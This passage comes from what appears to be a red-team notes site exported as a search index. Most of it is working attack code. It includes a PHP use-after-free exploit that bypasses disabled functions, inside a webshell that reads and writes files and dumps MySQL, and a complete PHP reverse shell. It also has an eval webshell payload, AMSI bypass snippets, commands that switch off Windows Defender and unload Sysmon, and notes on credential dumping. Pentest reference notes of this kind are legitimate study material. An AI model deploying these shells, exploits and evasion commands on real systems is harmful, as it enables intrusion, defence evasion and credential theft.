class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this-&gt;a);\n            $backtrace = (new Exception)-&gt;getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP &gt;= 7.4\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&amp;$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j &gt;= 0; $j--) {\n            $address &lt;&lt;= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i &lt; $m; $i++) {\n            $out .= chr($ptr &amp; 0xff);\n            $ptr &gt;&gt;= 8;\n        }\n        return $out;\n    }\n\n    function write(&amp;$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i &lt; $n; $i++) {\n            $str[$p + $i] = chr($v &amp; 0xff);\n            $v &gt;&gt;= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper-&gt;a);\n        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i &lt; $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i &lt; $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak &amp; 0xfffffffffffff000;\n        for($i = 0; $i &lt; 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle(str_repeat('A', 79));\n        $vuln = new Vuln();\n        $vuln-&gt;a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i &lt; $n_alloc; $i++)\n        $contiguous[] = str_shuffle(str_repeat('A', 79));\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper-&gt;b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i &lt; 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper-&gt;b)($cmd);\n    exit();\n}\n\n\n?&gt;\n\n&lt;body style=\"margin:20;padding:5\"&gt;\n&lt;pre&gt;\n&lt;b&gt;Disclaimer: Always use this webshell with permission of the servers owner.&lt;/b&gt;\n&lt;h1&gt; Filesystem Interaction &lt;/h1&gt;\n&lt;form method=\"post\"&gt;\nRead File: &lt;input type=\"text\" id=\"readfile\" name=\"readfile\"&gt;&lt;input type=\"submit\" value=\"Submit\"&gt;\n&lt;/form&gt;\n&lt;?php if (isset($_POST[\"readfile\"])){ readAFile($_POST[\"readfile\"]); } ?&gt;\n&lt;br&gt;\n&lt;form method=\"post\"&gt;\nList Dir: &lt;input type=\"text\" id=\"listdir\" name=\"listdir\"&gt;&lt;input type=\"submit\" value=\"Submit\"&gt;\n&lt;/form&gt;\n&lt;?php if (isset($_POST[\"listdir\"])){ listDir($_POST[\"listdir\"]); } ?&gt;\n&lt;br&gt;\n&lt;form method=\"post\"&gt;\nCreate Dir: &lt;input type=\"text\" id=\"dirpath\" name=\"dirpath\"&gt;  Perms: &lt;input type=\"text\" id=\"dirperms\" name=\"dirperms\" value=\"0777\"&gt; &lt;input type=\"submit\" value=\"Submit\"&gt;\n&lt;/form&gt;\n&lt;?php if (isset($_POST[\"dirpath\"]) &amp;&amp; isset($_POST[\"dirperms\"])){ createADir($_POST[\"dirpath\"], $_POST[\"dirperms\"]); } ?&gt;\n&lt;br&gt;\n&lt;form method=\"post\"&gt;\nChange Perms: &lt;input type=\"text\" id=\"permspath\" name=\"permspath\"&gt;  Perms: &lt;input type=\"text\" id=\"perms\" name=\"perms\" value=\"0600\"&gt; &lt;input type=\"submit\" value=\"Submit\"&gt;\n&lt;/form&gt;\n&lt;?php if (isset($_POST[\"permspath\"]) &amp;&amp; isset($_POST[\"perms\"])){ changePerms($_POST[\"permspath\"], $_POST[\"perms\"]); } ?&gt;\n&lt;br&gt;\n&lt;form method=\"post\"&gt;\nWrite file: &lt;input type=\"text\" id=\"filepath\" name=\"filepath\"&gt;&lt;br&gt;Content: &lt;br&gt;&lt;textarea rows=\"10\" cols=\"100\" name=\"content\"&gt;&lt;/textarea&gt; &lt;br&gt;&lt;input type=\"submit\" value=\"Submit\"&gt;\n&lt;/form&gt;\n&lt;?php if (isset($_POST[\"filepath\"]) &amp;&amp; isset($_POST[\"content\"])){ writeAFile($_POST[\"filepath\"], $_POST[\"content\"]); } ?&gt;\n&lt;br&gt;\n&lt;h1&gt; Disabled functions &lt;/h1&gt;\n&lt;?php check_exec_functions(); ?&gt;\n&lt;br&gt;\n&lt;h2&gt; PHP 7.0-7.4 Disabled Functions Bypass &lt;/h2&gt;\n&lt;form method=\"post\"&gt;\nCommand: &lt;input type=\"text\" id=\"cabesha\" name=\"cabesha\"&gt; &lt;input type=\"submit\" value=\"Submit\"&gt;\n&lt;/form&gt;\n&lt;?php if (isset($_POST[\"cabesha\"])){ pwn($_POST[\"cabesha\"]); } ?&gt;\n&lt;br&gt;\n&lt;h1&gt; Mysql Dump &lt;/h1&gt;\nNote that this will dump the WHOLE DATABASE. I have created this webshell for CTFs, DO NOT USE THIS IN PRODUCTION ENVIRONMENTS.\n&lt;form method=\"post\"&gt;\nMysql Username: &lt;input type=\"text\" id=\"mysqlusername\" name=\"mysqlusername\" value=\"root\"&gt;&lt;br&gt;\nMysql Password: &lt;input type=\"text\" id=\"mysqlpassword\" name=\"mysqlpassword\"&gt;&lt;br&gt;\nMysql Host: &lt;input type=\"text\" id=\"mysqlhost\" name=\"mysqlhost\" value=\"localhost\"&gt;&lt;br&gt;\n&lt;input type=\"checkbox\" id=\"dumpdefault\" name=\"dumpdefault\" value=\"yes\"&gt; Dump default  MySQL databases &lt;i&gt;(information_schema, mysql, performance_schema, sys) &lt;/i&gt;. Note that by default only non-default tables from these databases will be extracted.&lt;br&gt;\n&lt;input type=\"submit\" value=\"Dump Mysql\"&gt;\n&lt;/form&gt;\n&lt;?php if (isset($_POST[\"mysqlusername\"]) &amp;&amp; isset($_POST[\"mysqlpassword\"]) &amp;&amp; isset($_POST[\"mysqlhost\"])){ echo $_POST[\"dumpdefault\"].\"\\n\"; dumpDb($_POST[\"mysqlusername\"], $_POST[\"mysqlpassword\"], $_POST[\"mysqlhost\"], isset($_POST[\"dumpdefault\"])); } ?&gt;\n&lt;/pre&gt;\n&lt;h1&gt; PHPInfo &lt;/h1&gt;\n&lt;?php phpinfo(); ?&gt;\n&lt;/body&gt;\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/PHP/PHPinfo/","title":"PHPinfo","text":"<p>In cases where you can upload a file, you can output information about PHP's configuration.</p> <pre><code>&lt;?php\n  phpinfo()\n?&gt;\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/PHP/Reverse%20Shell/","title":"Reverse Shell","text":"<p>Info</p> <p>Link: https://github.com/ivan-sincek/php-reverse-shell</p> <p>This is an OS independent reverse shell based on the popular pentestmonkey reverse shell. Works on Linux OS, macOS, and Windows OS.</p> <pre><code>&lt;?php\n// Copyright (c) 2020 Ivan \u0160incek\n// v2.6\n// Requires PHP v5.0.0 or greater.\n// Works on Linux OS, macOS, and Windows OS.\n// See the original script at https://github.com/pentestmonkey/php-reverse-shell.\nclass Shell {\n    private $addr  = null;\n    private $port  = null;\n    private $os    = null;\n    private $shell = null;\n    private $descriptorspec = array(\n        0 =&gt; array('pipe', 'r'), // shell can read from STDIN\n        1 =&gt; array('pipe', 'w'), // shell can write to STDOUT\n        2 =&gt; array('pipe', 'w')  // shell can write to STDERR\n    );\n    private $buffer = 1024;  // read/write buffer size\n    private $clen   = 0;     // command length\n    private $error  = false; // stream read/write error\n    private $sdump  = true;  // script's dump\n    public function __construct($addr, $port) {\n        $this-&gt;addr = $addr;\n        $this-&gt;port = $port;\n    }\n    private function detect() {\n        $detected = true;\n        $os = PHP_OS;\n        if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {\n            $this-&gt;os    = 'LINUX';\n            $this-&gt;shell = '/bin/sh';\n        } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {\n            $this-&gt;os    = 'WINDOWS';\n            $this-&gt;shell = 'cmd.exe';\n        } else {\n            $detected = false;\n            echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n        }\n        return $detected;\n    }\n    private function daemonize() {\n        $exit = false;\n        if (!function_exists('pcntl_fork')) {\n            echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n        } else if (($pid = @pcntl_fork()) &lt; 0) {\n            echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n        } else if ($pid &gt; 0) {\n            $exit = true;\n            echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n            // once daemonized, you will actually no longer see the script's dump\n        } else if (posix_setsid() &lt; 0) {\n            echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n        } else {\n            echo \"DAEMONIZE: Completed successfully!\\n\";\n        }\n        return $exit;\n    }\n    private function settings() {\n        @error_reporting(0);\n        @set_time_limit(0); // do not impose the script execution time limit\n        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories\n    }\n    private function dump($data) {\n        if ($this-&gt;sdump) {\n            $data = str_replace('&lt;', '&amp;lt;', $data);\n            $data = str_replace('&gt;', '&amp;gt;', $data);\n            echo $data;\n        }\n    }\n    private function read($stream, $name, $buffer) {\n        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream\n            $this-&gt;error = true;                            // set the global error flag\n            echo \"STRM_ERROR: Cannot read from {$name}, script will now exit...\\n\";\n        }\n        return $data;\n    }\n    private function write($stream, $name, $data) {\n        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream\n            $this-&gt;error = true;                            // set the global error flag\n            echo \"STRM_ERROR: Cannot write to {$name}, script will now exit...\\n\";\n        }\n        return $bytes;\n    }\n    // read/write method for non-blocking streams\n    private function rw($input, $output, $iname, $oname) {\n        while (($data = $this-&gt;read($input, $iname, $this-&gt;buffer)) &amp;&amp; $this-&gt;write($output, $oname, $data)) {\n            if ($this-&gt;os === 'WINDOWS' &amp;&amp; $oname === 'STDIN') { $this-&gt;clen += strlen($data); } // calculate the command length\n            $this-&gt;dump($data); // script's dump\n        }\n    }\n    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)\n    // we must read the exact byte length from a stream and not a single byte more\n    private function brw($input, $output, $iname, $oname) {\n        $size = fstat($input)['size'];\n        if ($this-&gt;os === 'WINDOWS' &amp;&amp; $iname === 'STDOUT' &amp;&amp; $this-&gt;clen) {\n            // for some reason Windows OS pipes STDIN into STDOUT\n            // we do not like that\n            // so we need to discard the data from the stream\n            while ($this-&gt;clen &gt; 0 &amp;&amp; ($bytes = $this-&gt;clen &gt;= $this-&gt;buffer ? $this-&gt;buffer : $this-&gt;clen) &amp;&amp; $this-&gt;read($input, $iname, $bytes)) {\n                $this-&gt;clen -= $bytes;\n                $size -= $bytes;\n            }\n        }\n        while ($size &gt; 0 &amp;&amp; ($bytes = $size &gt;= $this-&gt;buffer ? $this-&gt;buffer : $size) &amp;&amp; ($data = $this-&gt;read($input, $iname, $bytes)) &amp;&amp; $this-&gt;write($output, $oname, $data)) {\n            $size -= $bytes;\n            $this-&gt;dump($data); // script's dump\n        }\n    }\n    public function run() {\n        if ($this-&gt;detect() &amp;&amp; !$this-&gt;daemonize()) {\n            $this-&gt;settings();\n\n            // ----- SOCKET BEGIN -----\n            $socket = @fsockopen($this-&gt;addr, $this-&gt;port, $errno, $errstr, 30);\n            if (!$socket) {\n                echo \"SOC_ERROR: {$errno}: {$errstr}\\n\";\n            } else {\n                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS\n\n                // ----- SHELL BEGIN -----\n                $process = @proc_open($this-&gt;shell, $this-&gt;descriptorspec, $pipes, null, null);\n                if (!$process) {\n                    echo \"PROC_ERROR: Cannot start the shell\\n\";\n                } else {\n                    foreach ($pipes as $pipe) {\n                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS\n                    }\n\n                    // ----- WORK BEGIN -----\n                    $status = proc_get_status($process);\n                    @fwrite($socket, \"SOCKET: Shell has connected! PID: {$status['pid']}\\n\");\n                    do {\n                        $status = proc_get_status($process);\n                        if (feof($socket)) { // check for end-of-file on SOCKET\n                            echo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;\n                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running\n                            echo \"PROC_ERROR: Shell process has been terminated\\n\";   break; // feof() does not work with blocking streams\n                        }                                                                    // use proc_get_status() instead\n                        $streams = array(\n                            'read'   =&gt; array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR\n                            'write'  =&gt; null,\n                            'except' =&gt; null\n                        );\n                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS\n                        if ($num_changed_streams === false) {\n                            echo \"STRM_ERROR: stream_select() failed\\n\"; break;\n                        } else if ($num_changed_streams &gt; 0) {\n                            if ($this-&gt;os === 'LINUX') {\n                                if (in_array($socket  , $streams['read'])) { $this-&gt;rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\n                                if (in_array($pipes[2], $streams['read'])) { $this-&gt;rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\n                                if (in_array($pipes[1], $streams['read'])) { $this-&gt;rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\n                            } else if ($this-&gt;os === 'WINDOWS') {\n                                // order is important\n                                if (in_array($socket, $streams['read'])/*------*/) { $this-&gt;rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\n                                if (($fstat = fstat($pipes[2])) &amp;&amp; $fstat['size']) { $this-&gt;brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\n                                if (($fstat = fstat($pipes[1])) &amp;&amp; $fstat['size']) { $this-&gt;brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\n                            }\n                        }\n                    } while (!$this-&gt;error);\n                    // ------ WORK END ------\n\n                    foreach ($pipes as $pipe) {\n                        fclose($pipe);\n                    }\n                    proc_close($process);\n                }\n                // ------ SHELL END ------\n\n                fclose($socket);\n            }\n            // ------ SOCKET END ------\n\n        }\n    }\n}\necho '&lt;pre&gt;';\n// change the host address and/or port number as necessary\n$sh = new Shell('127.0.0.1', 9000);\n$sh-&gt;run();\nunset($sh);\n// garbage collector requires PHP v5.3.0 or greater\n// @gc_collect_cycles();\necho '&lt;/pre&gt;';\n?&gt;\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/PHP/TinyShell/","title":"TinyShell","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/07.%20Payloads/PHP/TinyShell/#overview","title":"Overview","text":"<ul> <li>TBA</li> </ul>"},{"location":"Red%20Cell/07.%20Payloads/PHP/TinyShell/#general-usage","title":"General Usage","text":"<p>Installation <pre><code># Download Tiny Shell and dependencies\ngit clone https://github.com/threatexpress/tinyshell\ncd tinyshell\npip install docopt\npip install requests\n</code></pre></p> <p>Payload <pre><code># Payload\n&lt;?php @eval(&lt;insert_here&gt;);?&gt;\n&lt;!-- Unencoded Post:         $_POST['password'] --&gt;\n&lt;!-- Base64 Encoded Post:    base64_decode($_POST['token']) --&gt;\n&lt;!-- Base64 Encoded Header:  base64_decode($_SERVER['HTTP_PSESSION']) --&gt;\n</code></pre></p> <p>Usage <pre><code># Base64 Encoded Post\npython2 tinyshell.py --url=http://&lt;ip_addr&gt;/&lt;payload_file&gt; --language=php --password=token --mode=base64_post\n\n# Base64 Encoded Header\npython2 tinyshell.py --url=http://&lt;ip_addr&gt;/&lt;payload_file&gt; --language=php --password=psession --mode=base64_header\n</code></pre></p>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/","title":"Defense Evasion","text":"<ul> <li>Defense evasion encompasses a range of techniques to circumvent or disable security measures, such as intrusion detection systems or antivirus software, allowing unhindered/undetected action on a target.</li> </ul>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/#table-of-contents","title":"Table of Contents","text":"<ul> <li>AMSI Bypasses</li> <li>C Sharp Heuristics Evasion</li> <li>Neutering Windows Defender</li> <li>Unloading Filter Drivers</li> </ul>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/AMSI%20Bypasses/","title":"AMSI Bypasses","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/AMSI%20Bypasses/#overview","title":"Overview","text":"<p>AMSI stands for \"Antimalware Scan Interface\" and is the predominant defense against malicious PowerShell scripts and tools on Windows systems.</p> <p>When a script is executed in a supported environment (e.g., a PowerShell script), the script content can be passed to the installed antivirus or antimalware software via AMSI for scanning before execution. If malicious code is detected, the execution can be blocked.</p> <p>(This is separate from Windows Defender Real-time Protection or anything being downloaded to/executed from disk.)</p> <p>Because of this, a key goal for attackers is to bypass AMSI.</p>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/AMSI%20Bypasses/#powershell-examples","title":"PowerShell Example(s)","text":"<ul> <li> <p>Example Bypass #1: Setting AMSI context to null. <pre><code># Works in both PowerShell and PowerShell Core\n$Var = [Ref].Assembly.GetTypes() | %{if ($_.Name -like \"*Am*s*ils*\") {$_.GetFields(\"NonPublic,Static\") | ?{$_.Name -like \"*ontext\"}}}\n[IntPtr]$Ptr=$Var.GetValue($NULL); [Int32[]]$Buff=@(0)\n[System.Runtime.InteropServices.Marshal]::Copy($Buff, 0, $Ptr, 1)\n</code></pre></p> </li> <li> <p>Example Bypass #2: Telling AMSI that initialization failed. <pre><code># Does not work in PowerShell Core\n$Var = [Ref].Assembly.GetTypes() | %{if ($_.Name -like \"*Am*s*ils*\") {$_.GetFields(\"NonPublic,Static\") | ?{$_.Name -like \"*ailed*\"}}}\n$Var.SetValue($NULL,$TRUE)\n</code></pre></p> </li> </ul>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/C%20Sharp%20Heuristics%20Evasion/","title":"C Sharp Heuristics Evasion","text":"<p>Info</p> <p>This note is still in development.</p> <pre><code>using System;\nusing System.Diagnostics;\nusing System.Runtime.InteropServices;\n\npublic class Example\n{\n    // Using Esoteric Windows API Calls\n    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr VirtualAllocExNuma(IntPtr hprocess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreffered);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr GetCurrentProcess();\n\n\n    public static void Main()\n    {\n        // Rudimentary AV Heuristics Bypass by calling an Uncommon API\n        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);\n        if (mem == null)\n        {\n            return;\n        }\n\n        // The rest of your code here...\n    }\n}\n</code></pre>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/Neutering%20Windows%20Defender/","title":"Neutering Windows Defender","text":"<p>Info</p> <p>Requires elevated privileges to run.</p>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/Neutering%20Windows%20Defender/#overview","title":"Overview","text":"<p>On networks without third party AV solutions, Windows Defender will be your biggest enemy; the level of difficulty will vary based upon how up-to-date the definitions are.</p>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/Neutering%20Windows%20Defender/#rollback-definitions-with-mpcmdrunexe","title":"Rollback Definitions with MpCmdRun.exe","text":"<pre><code># CMD\n\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n\n# PowerShell\n. \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n</code></pre>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/Neutering%20Windows%20Defender/#disabling-features-with-powershell","title":"Disabling Features with PowerShell","text":"<pre><code># Disable scanning of all downloaded files and attachments\nSet-MpPreference -DisableIOAVProtection $TRUE \n\n# Disable Realtime Monitoring\nSet-MpPreference -DisableRealtimeMonitoring $TRUE\n\n# Disable Script Scanning (potentially AMSI)\nSet-MpPreference -DisableScriptScanning $TRUE\n\n# Add path to be ignored by Windows Defender\nAdd-MpPreference -ExclusionPath \"C:\\\"\n</code></pre>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/Unloading%20Filter%20Drivers/","title":"Unloading Filter Drivers","text":"<p>Info</p> <p>Requires elevated privileges to run.</p>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/Unloading%20Filter%20Drivers/#overview","title":"Overview","text":"<p>Within elevated sessions, you can unload different drivers to reduce visibility and collection.  A prime example of this would be using the built-in <code>fltmc</code> tool.</p> <p></p> <p>The <code>fltmc</code> tool is a command-line utility in Microsoft Windows used to manage and query the status of the filter drivers that are installed on a system. Filter drivers are software components that intercept and modify data as it passes between software components and hardware devices. These filter drivers are often used for various purposes, including:</p> <ol> <li> <p>File System Filters: File system filter drivers are commonly used for tasks such as antivirus scanning, encryption, compression, and real-time file access monitoring.</p> </li> <li> <p>Device Driver Filters: Device driver filter drivers can be used for tasks like monitoring and controlling input and output to devices, such as printers or storage devices.</p> </li> <li> <p>Network Filters: Network filter drivers are used for tasks such as firewalling, intrusion detection, and network packet inspection.</p> </li> </ol>"},{"location":"Red%20Cell/08.%20Defense%20Evasion/Unloading%20Filter%20Drivers/#example","title":"Example","text":"<p>An example of use case would be utilizing <code>fltmc</code> to unload Sysmon during an engagement to reduce defender visibility.</p> <pre><code># List currently loaded drivers\nfltmc\n\n# Unload Sysmon Driver\nfltmc unload SysmonDrv\n</code></pre> <ul> <li>Example output from a Sliver beacon </li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/","title":"Credential Dumping","text":"<ul> <li>Credential dumping involves extracting and collecting user login credentials or password hashes from a compromised system, allowing unauthorized access to additional network resources.</li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Windows Authentication</li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/#using-built-in-utilities","title":"Using Built-in Utilities","text":"<ul> <li>comsvcs.dll</li> <li>reg.exe</li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/#using-custom-tools","title":"Using Custom Tools","text":"<ul> <li>mimikatz</li> <li>pypykatz</li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Windows%20Authentication/","title":"Windows Authentication","text":""},{"location":"Red%20Cell/09.%20Credential%20Dumping/Windows%20Authentication/#overview","title":"Overview","text":"<ul> <li>The purpose of this note is to cover some of the key points of Windows authentication, excluding Kerberos</li> </ul> <p>Info</p> <p>For a Kerberos overview, see my Kerberos Authentication Overview note.</p> <ul> <li>BLUF:<ol> <li>SAM is the local database in a Windows system that holds use account information.</li> <li>LSASS is the system service that interacts with the SAM database to authenticate users and handle other security tasks. </li> <li>NTLM is a suite of authentication protocols utilized by LSASS to verify the identity of users based on the credentials stored in the SAM database.</li> </ol> </li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Windows%20Authentication/#lsass-vs-sam","title":"LSASS vs SAM","text":"<ul> <li> <p>SAM:</p> <ul> <li>The SAM (Security Accounts Manager) database is a part of the Windows Registry and stores user account information, including usernames, password hashes, and security policies.</li> <li>It is the primary source of local user account data on a Windows system.</li> </ul> </li> <li> <p>LSASS:</p> <ul> <li>LSASS (Local Security Authority Subsystem Service) is a crucial system service in Windows responsible for managing user authentication and enforcing security policies.</li> <li>It interacts with the SAM database to handle user logins, verify credentials, and govern access controls, making it integral to the security of Windows-based systems.</li> </ul> </li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Windows%20Authentication/#dumping-lsass","title":"Dumping LSASS","text":"<ul> <li>When dumping LSASS, you are dumping the running <code>lsass.exe</code> process memory.  This contains hashes for the currently logged on users, because...<ul> <li>Password hashes are stored in LSASS memory after a user successfully authenticates during login. </li> <li>Storing these hashes in memory allows LSASS to avoid querying the SAM database every time the user needs to authenticate for a resource or access a service.</li> <li>Once a user has authenticated, their password hash is cached in LSASS memory for subsequent authentication requests, making the process more efficient and avoiding the need to repeatedly access the SAM database for the same user.</li> </ul> </li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Windows%20Authentication/#ntlm","title":"NTLM","text":"<p>While LSASS is the service that manages authentication with the SAM database, NTLM (NT LAN Manager) is the suite of authentication protocols LSASS utilizes for the negotiation and verification of user identities based on NTLM hashes (as well as challenge-response mechanisms).</p> <p>What are NTLM hashes? </p>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Windows%20Authentication/#ntlm-vs-net-ntlm","title":"NTLM vs Net-NTLM","text":""},{"location":"Red%20Cell/09.%20Credential%20Dumping/Windows%20Authentication/#ntlm-ntlmv1","title":"NTLM (NTLMv1):","text":"<ul> <li>These hashes are stored in the SAM database and/or in the Domain Controller's <code>NTDS.dit</code> database.</li> <li>NTLMv1 hashes look like this:</li> </ul> <pre><code>aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42\n              LM                :             NT\n</code></pre>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Windows%20Authentication/#net-ntlm-ntlmv2","title":"Net-NTLM (NTLMv2):","text":"<ul> <li>These hashes are used for network authentication.  They are derived from a challenge/response algorithm and are based on the user's NT hash.</li> <li>NTLMv2 hashes Looks like this:</li> </ul> <pre><code>admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030\n</code></pre>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Windows%20Authentication/#pass-the-hash","title":"Pass-The-Hash:","text":"<ul> <li>You\u00a0CAN\u00a0perform Pass-The-Hash attacks 